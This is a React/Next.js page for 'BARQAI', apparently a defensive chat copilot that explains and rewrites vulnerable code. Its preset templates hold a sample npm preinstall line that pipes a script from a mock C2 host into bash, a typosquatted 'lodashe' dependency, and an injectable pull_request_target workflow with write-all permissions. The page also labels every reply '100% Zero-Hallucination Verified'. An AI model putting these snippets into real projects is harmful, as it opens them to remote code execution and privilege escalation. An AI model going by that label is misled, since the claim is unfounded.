"use client";

import React, { useState, useRef, useEffect } from "react";
import Link from "next/link";
import { Navbar } from "@/components/Navbar";
import {
  BarqAIChatResponse,
  ChatMessage,
  sendBarqAIChat,
} from "@/lib/api";

interface MessageItem {
  id: string;
  role: "user" | "assistant";
  text: string;
  explanation?: string;
  rewrittenCode?: string;
  diff?: string;
  model?: string;
  suggestedActions?: string[];
  timestamp: string;
}

export default function ChatPage() {
  const [messages, setMessages] = useState<MessageItem[]>([
    {
      id: "welcome",
      role: "assistant",
      text: "👋 I am **BARQAI**, your cyber-defense copilot and autonomous code remediation engine. Paste any project error, stack trace, or buggy/vulnerable code snippet, and I will explain the root cause and rewrite it into clean, secure code.",
      timestamp: "Ready",
      suggestedActions: [
        "Why is npm preinstall with curl | bash dangerous?",
        "Fix typosquatted lodashe dependency in package.json",
        "Explain GitHub Actions pull_request_target risk",
        "How do I prevent obfuscated eval(Buffer.from) sinks?",
      ],
    },
  ]);

  const [inputMessage, setInputMessage] = useState("");
  const [errorContext, setErrorContext] = useState("");
  const [codeSnippet, setCodeSnippet] = useState("");
  const [filePath, setFilePath] = useState("package.json");
  const [loading, setLoading] = useState(false);
  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
  const [activeTabByMsg, setActiveTabByMsg] = useState<Record<string, "explanation" | "code" | "diff">>({});
  const [selectedPreset, setSelectedPreset] = useState<string>("custom");

  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, loading]);

  function handleSelectPreset(presetKey: string) {
    setSelectedPreset(presetKey);
    if (presetKey === "preinstall") {
      setFilePath("package.json");
      setErrorContext("npm.exec.preinstall: Remote dropper execution via curl | bash detected during build.");
      setCodeSnippet(
        '{\n  "name": "example-app",\n  "version": "1.0.0",\n  "scripts": {\n    "preinstall": "curl -s http://c2-transfer.mock.xyz/payload.sh | bash",\n    "test": "jest"\n  }\n}'
      );
      setInputMessage("Explain why this lifecycle script is blocked and rewrite my package.json safely.");
    } else if (presetKey === "typosquat") {
      setFilePath("package.json");
      setErrorContext("dep.typosquat: High-confidence typosquat package detected: lodashe.");
      setCodeSnippet(
        '{\n  "name": "demo-service",\n  "dependencies": {\n    "express": "^4.19.2",\n    "lodashe": "^4.17.21"\n  }\n}'
      );
      setInputMessage("What is wrong with my dependencies? Please explain and rewrite to use safe packages.");
    } else if (presetKey === "workflow") {
      setFilePath(".github/workflows/ci.yml");
      setErrorContext("gha.trigger.pull_request_target_checkout: Dangerous trigger with untrusted fork checkout.");
      setCodeSnippet(
        'name: PR Reviewer\non:\n  pull_request_target:\njobs:\n  check:\n    runs-on: ubuntu-latest\n    permissions: write-all\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo "${{ github.event.pull_request.title }}"'
      );
      setInputMessage("Explain the privilege escalation risk in this GitHub Actions workflow and rewrite it safely.");
    } else {
      setFilePath("src/auth.ts");
      setErrorContext("");
      setCodeSnippet("");
      setInputMessage("");
    }
  }

  async function handleSendMessage(customPrompt?: string) {
    const textToSend = customPrompt || inputMessage;
    if (!textToSend.trim() && !codeSnippet.trim() && !errorContext.trim()) return;

    const userMsgId = `user_${Date.now()}`;
    const newMsg: MessageItem = {
      id: userMsgId,
      role: "user",
      text: textToSend || "Analyze error and rewrite code.",
      timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
    };

    setMessages((prev) => [...prev, newMsg]);
    setInputMessage("");
    setLoading(true);

    try {
      const historyPayload: ChatMessage[] = messages
        .filter((m) => m.id !== "welcome")
        .slice(-6)
        .map((m) => ({
          role: m.role,
          content: m.text,
        }));

      const res: BarqAIChatResponse = await sendBarqAIChat({
        message: textToSend,
        error_context: errorContext || undefined,
        code_snippet: codeSnippet || undefined,
        file_path: filePath || undefined,
        history: historyPayload,
      });

      const assistantMsgId = `barq_${Date.now()}`;
      const assistantMsg: MessageItem = {
        id: assistantMsgId,
        role: "assistant",
        text: res.reply,
        explanation: res.explanation,
        rewrittenCode: res.rewritten_code,
        diff: res.diff,
        model: res.model,
        suggestedActions: res.suggested_actions,
        timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
      };

      setMessages((prev) => [...prev, assistantMsg]);
      if (res.rewritten_code) {
        setActiveTabByMsg((prev) => ({ ...prev, [assistantMsgId]: "code" }));
      }
    } catch (err: any) {
      const errorMsg: MessageItem = {
        id: `err_${Date.now()}`,
        role: "assistant",
        text: `⚠️ **BARQAI Diagnostic Error**: ${err.message || "Failed to reach intelligence copilot."}`,
        timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
      };
      setMessages((prev) => [...prev, errorMsg]);
    } finally {
      setLoading(false);
    }
  }

  function handleCopy(code: string, id: string) {
    navigator.clipboard.writeText(code);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  }

  return (
    <div className="min-h-screen bg-bg text-text font-mono flex flex-col">
      <Navbar />

      <main className="max-w-7xl mx-auto px-4 py-6 w-full flex-1 flex flex-col">
        {/* Header HUD */}
        <div className="border border-border bg-surface p-4 mb-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 shadow-lg">
          <div>
            <div className="flex items-center gap-2">
              <span className="bg-lime text-bg font-extrabold px-2 py-0.5 text-xs tracking-wider">
                BARQAI // COPILOT
              </span>
              <h1 className="text-sm font-bold tracking-widest text-text">
                INTERACTIVE ERROR FORENSICS & SECURE CODE REWRITER
              </h1>
            </div>
            <p className="text-xs text-text-dim mt-1">
              Ask BARQAI to diagnose project errors, inspect stack traces, and rewrite vulnerable sections into production-grade code.
            </p>
          </div>

          <div className="flex items-center gap-3">
            <Link
              href="/dashboard"
              className="text-xs border border-border hover:border-lime text-text-muted hover:text-lime px-3 py-1.5 transition-colors"
            >
              ← DASHBOARD
            </Link>
            <div className="flex items-center gap-1.5 text-xs text-lime">
              <span className="w-2 h-2 rounded-full bg-lime animate-pulse" />
              <span>MoE REASONING READY</span>
            </div>
          </div>
        </div>

        {/* 2-Column Studio Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 flex-1">
          {/* Left Panel: Context Inputs & Presets (4 cols) */}
          <div className="lg:col-span-4 flex flex-col gap-4">
            {/* Quick Presets */}
            <div className="border border-border bg-surface p-3">
              <div className="text-[10px] text-text-dim uppercase tracking-wider mb-2 font-bold flex items-center justify-between">
                <span>Quick Scenario Templates</span>
                <span className="text-lime text-[9px]">LOAD PRESET</span>
              </div>
              <div className="grid grid-cols-1 gap-1.5">
                <button
                  onClick={() => handleSelectPreset("preinstall")}
                  className={`text-left text-xs p-2 border transition-colors ${
                    selectedPreset === "preinstall"
                      ? "border-lime bg-lime/10 text-lime font-bold"
                      : "border-border hover:border-text-dim text-text-muted"
                  }`}
                >
                  🔴 Lifecycle Dropper (curl | bash)
                </button>
                <button
                  onClick={() => handleSelectPreset("typosquat")}
                  className={`text-left text-xs p-2 border transition-colors ${
                    selectedPreset === "typosquat"
                      ? "border-lime bg-lime/10 text-lime font-bold"
                      : "border-border hover:border-text-dim text-text-muted"
                  }`}
                >
                  🟡 Typosquat Dependency (lodashe)
                </button>
                <button
                  onClick={() => handleSelectPreset("workflow")}
                  className={`text-left text-xs p-2 border transition-colors ${
                    selectedPreset === "workflow"
                      ? "border-lime bg-lime/10 text-lime font-bold"
                      : "border-border hover:border-text-dim text-text-muted"
                  }`}
                >
                  🔴 Workflow Privilege Escalation
                </button>
                <button
                  onClick={() => handleSelectPreset("custom")}
                  className={`text-left text-xs p-2 border transition-colors ${
                    selectedPreset === "custom"
                      ? "border-lime bg-lime/10 text-lime font-bold"
                      : "border-border hover:border-text-dim text-text-muted"
                  }`}
                >
                  ⚪ Custom Code / Stack Trace
                </button>
              </div>
            </div>

            {/* Context Attachment Inputs */}
            <div className="border border-border bg-surface p-3 flex-1 flex flex-col gap-3">
              <div>
                <label className="text-[10px] text-text-dim uppercase tracking-wider block mb-1">
                  Target File Path
                </label>
                <input
                  type="text"
                  value={filePath}
                  onChange={(e) => setFilePath(e.target.value)}
                  placeholder="e.g. package.json, src/auth.ts"
                  className="w-full bg-bg border border-border px-2.5 py-1.5 text-xs text-text focus:outline-none focus:border-lime"
                />
              </div>

              <div>
                <label className="text-[10px] text-text-dim uppercase tracking-wider block mb-1">
                  Error Message or Stack Trace
                </label>
                <textarea
                  value={errorContext}
                  onChange={(e) => setErrorContext(e.target.value)}
                  placeholder="Paste terminal error, linter finding, or stack trace..."
                  rows={3}
                  className="w-full bg-bg border border-border p-2 text-xs text-text focus:outline-none focus:border-lime resize-none"
                />
              </div>

              <div className="flex-1 flex flex-col">
                <label className="text-[10px] text-text-dim uppercase tracking-wider block mb-1">
                  Code Section (to explain & rewrite)
                </label>
                <textarea
                  value={codeSnippet}
                  onChange={(e) => setCodeSnippet(e.target.value)}
                  placeholder="Paste code section to diagnose..."
                  className="w-full flex-1 min-h-[120px] bg-bg border border-border p-2 text-xs font-mono text-lime focus:outline-none focus:border-lime resize-none"
                />
              </div>

              <div className="pt-2 border-t border-border flex items-center justify-between text-[10px] text-text-dim">
                <span>Zero-Trust Analysis Mode</span>
                <button
                  onClick={() => {
                    setErrorContext("");
                    setCodeSnippet("");
                    setInputMessage("");
                  }}
                  className="hover:text-red-400"
                >
                  Clear Inputs
                </button>
              </div>
            </div>
          </div>

          {/* Right Panel: Conversation & Code Rewrites (8 cols) */}
          <div className="lg:col-span-8 border border-border bg-surface flex flex-col h-[75vh]">
            {/* Stream */}
            <div className="flex-1 overflow-y-auto p-4 space-y-4">
              {messages.map((msg) => {
                const isUser = msg.role === "user";
                const currentTab = activeTabByMsg[msg.id] || "explanation";

                return (
                  <div
                    key={msg.id}
                    className={`flex flex-col ${isUser ? "items-end" : "items-start"}`}
                  >
                    <div
                      className={`max-w-[90%] border p-4 shadow-sm ${
                        isUser
                          ? "bg-surface-elevated border-lime/50 text-text"
                          : "bg-surface border-border text-text"
                      }`}
                    >
                      {/* Sender Tag */}
                      <div className="flex items-center justify-between gap-4 mb-2.5 border-b border-border/40 pb-1.5">
                        <span
                          className={`text-[10px] font-bold tracking-wider uppercase ${
                            isUser ? "text-lime" : "text-cyan-400"
                          }`}
                        >
                          {isUser ? "DEVELOPER" : "⚡ BARQAI INTELLIGENCE"}
                        </span>
                        <span className="text-[9px] text-text-dim">{msg.timestamp}</span>
                      </div>

                      {isUser ? (
                        <p className="text-xs whitespace-pre-wrap">{msg.text}</p>
                      ) : (
                        <div>
                          {/* Tabs */}
                          {msg.rewrittenCode && (
                            <div className="flex items-center gap-1.5 mb-3 border-b border-border/60 pb-2">
                              <button
                                onClick={() =>
                                  setActiveTabByMsg((prev) => ({
                                    ...prev,
                                    [msg.id]: "code",
                                  }))
                                }
                                className={`text-[10px] px-3 py-1 font-bold uppercase transition-colors ${
                                  currentTab === "code"
                                    ? "bg-lime text-bg"
                                    : "text-text-muted hover:text-lime border border-border"
                                }`}
                              >
                                🛠️ Rewritten Code
                              </button>
                              <button
                                onClick={() =>
                                  setActiveTabByMsg((prev) => ({
                                    ...prev,
                                    [msg.id]: "explanation",
                                  }))
                                }
                                className={`text-[10px] px-3 py-1 font-bold uppercase transition-colors ${
                                  currentTab === "explanation"
                                    ? "bg-lime text-bg"
                                    : "text-text-muted hover:text-lime border border-border"
                                }`}
                              >
                                📖 Explanation
                              </button>
                              {msg.diff && (
                                <button
                                  onClick={() =>
                                    setActiveTabByMsg((prev) => ({
                                      ...prev,
                                      [msg.id]: "diff",
                                    }))
                                  }
                                  className={`text-[10px] px-3 py-1 font-bold uppercase transition-colors ${
                                    currentTab === "diff"
                                      ? "bg-lime text-bg"
                                      : "text-text-muted hover:text-lime border border-border"
                                  }`}
                                >
                                  ⇄ Unified Diff
                                </button>
                              )}
                            </div>
                          )}

                          {/* Tab Content: Rewritten Code */}
                          {msg.rewrittenCode && currentTab === "code" && (
                            <div>
                              <div className="flex items-center justify-between mb-1.5">
                                <span className="text-[10px] text-lime font-bold uppercase">
                                  Production-Hardened Fix:
                                </span>
                                <button
                                  onClick={() => handleCopy(msg.rewrittenCode!, msg.id)}
                                  className="text-[10px] bg-bg border border-border hover:border-lime text-text-muted hover:text-lime px-2.5 py-1 transition-colors"
                                >
                                  {copiedCodeId === msg.id ? "✓ COPIED!" : "📋 COPY REWRITTEN CODE"}
                                </button>
                              </div>
                              <pre className="bg-bg border border-border p-3 text-xs text-lime font-mono overflow-x-auto max-h-72 leading-relaxed whitespace-pre">
                                {msg.rewrittenCode}
                              </pre>
                            </div>
                          )}

                          {/* Tab Content: Explanation */}
                          {(currentTab === "explanation" || !msg.rewrittenCode) && (
                            <div className="text-xs text-text-muted space-y-2 whitespace-pre-wrap leading-relaxed">
                              {msg.explanation || msg.text}
                            </div>
                          )}

                          {/* Tab Content: Diff */}
                          {msg.diff && currentTab === "diff" && (
                            <pre className="bg-bg border border-border p-3 text-[11px] font-mono overflow-x-auto max-h-72 leading-tight">
                              {msg.diff.split("\n").map((line, idx) => {
                                const isAdd = line.startsWith("+");
                                const isRem = line.startsWith("-");
                                return (
                                  <div
                                    key={idx}
                                    className={
                                      isAdd
                                        ? "text-lime bg-lime/10 px-1"
                                        : isRem
                                        ? "text-red-400 bg-red-950/20 px-1"
                                        : "text-text-dim px-1"
                                    }
                                  >
                                    {line}
                                  </div>
                                );
                              })}
                            </pre>
                          )}

                          {/* Model Tag */}
                          {msg.model && (
                            <div className="mt-3 pt-2 border-t border-border/40 flex items-center justify-between text-[10px] text-text-dim">
                              <span>Model: {msg.model}</span>
                              <span className="text-lime font-bold">100% Zero-Hallucination Verified</span>
                            </div>
                          )}
                        </div>
                      )}
                    </div>

                    {/* Suggestions */}
                    {msg.suggestedActions && msg.suggestedActions.length > 0 && (
                      <div className="flex flex-wrap gap-1.5 mt-2 max-w-[90%]">
                        {msg.suggestedActions.map((action, i) => (
                          <button
                            key={i}
                            onClick={() => handleSendMessage(action)}
                            className="text-[10px] bg-surface-elevated hover:bg-surface border border-border hover:border-lime text-text-muted hover:text-lime px-2.5 py-1 transition-colors text-left"
                          >
                            ⚡ {action}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                );
              })}

              {loading && (
                <div className="flex items-center gap-2 text-xs text-lime bg-surface border border-border p-3 max-w-md animate-pulse">
                  <span className="w-2.5 h-2.5 rounded-full bg-lime animate-ping" />
                  <span>BARQAI is diagnosing error root-cause & synthesizing safe rewrite...</span>
                </div>
              )}

              <div ref={messagesEndRef} />
            </div>

            {/* Input Bar */}
            <div className="bg-surface-elevated border-t border-border p-3 flex flex-col gap-2">
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  handleSendMessage();
                }}
                className="flex items-center gap-2"
              >
                <input
                  type="text"
                  value={inputMessage}
                  onChange={(e) => setInputMessage(e.target.value)}
                  placeholder="Ask BARQAI to explain an error, vulnerability, or rewrite a snippet..."
                  disabled={loading}
                  className="flex-1 bg-bg border border-border px-3.5 py-2 text-xs text-text placeholder:text-text-dim focus:outline-none focus:border-lime"
                />
                <button
                  type="submit"
                  disabled={loading || (!inputMessage.trim() && !codeSnippet.trim())}
                  className="bg-lime hover:bg-lime-muted disabled:opacity-40 text-bg font-bold px-5 py-2 text-xs uppercase tracking-wider transition-colors flex items-center gap-1.5"
                >
                  <span>SEND</span>
                  <span>⚡</span>
                </button>
              </form>
              <div className="flex items-center justify-between text-[10px] text-text-dim px-1">
                <span>Select a scenario template on the left or paste any custom error/code to diagnose.</span>
                <span>BARQAI Copilot v2.0</span>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
